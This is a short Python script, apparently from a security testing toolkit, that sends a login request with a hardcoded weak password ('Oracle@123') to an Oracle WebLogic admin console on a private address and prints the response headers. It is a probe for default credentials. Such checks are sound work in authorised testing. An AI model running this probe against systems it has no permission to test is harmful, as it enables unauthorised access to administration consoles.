# -*- encoding: utf-8 -*-
'''
@File   : weblogic-login.py
@Time   : 2023-11-08 13:53:46
@Author : pan
'''
import requests


def WeblogicLogin(target: str):
    url = "/console/j_security_check"
    headers = {
        "Host": "10.0.35.66:7001",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    vulUrl = target + url
    payloads = "j_username=weblogic&j_password=Oracle@123&j_character_encoding=UTF-8"
    # result = requests.post(url=vulUrl, headers=headers, data=payloads, allow_redirects=False)
    result = requests.post(url=vulUrl, headers=headers, data=payloads)
    # print(result.text)
    # print(result.status_code)
    print(result.headers)


if __name__ == "__main__":
    WeblogicLogin("http://10.0.35.66:7001")